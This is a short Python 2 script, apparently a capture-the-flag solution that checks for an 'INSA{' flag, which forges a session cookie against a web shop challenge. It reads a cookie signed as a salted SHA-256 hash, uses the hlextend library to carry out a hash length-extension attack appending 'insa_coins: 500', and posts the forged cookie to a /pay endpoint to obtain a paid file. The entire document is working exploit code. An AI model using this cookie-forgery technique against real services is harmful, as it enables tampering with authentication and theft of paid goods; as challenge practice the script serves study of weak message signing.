#!/usr/bin/env python2.7
# encoding: utf-8
import hlextend
import base64
import requests

# url = "http://localhost:5000"
url = "https://kx4hdh2zo5rstcuj.onion.to/"

r = requests.get(url)
salt, h, data = r.cookies["user"].split(":")
data = base64.urlsafe_b64decode(data)

sha = hlextend.new('sha256')

toinject = 'xxx: xxx\ninsa_coins: 500\n'

res = sha.extend(toinject, salt + data, 20, h, raw=True)
res = res[len(salt):]

new_cookie = salt + ":" + sha.hexdigest() + ":" + base64.urlsafe_b64encode(res)
resp = requests.post(url + "/pay?file=3&cost=500", cookies={"user": new_cookie}, data='')

res = resp.text[-100:]
if "INSA{" in res:
    exit(0)

print resp.status
print len(resp.content)
print res
exit(1)

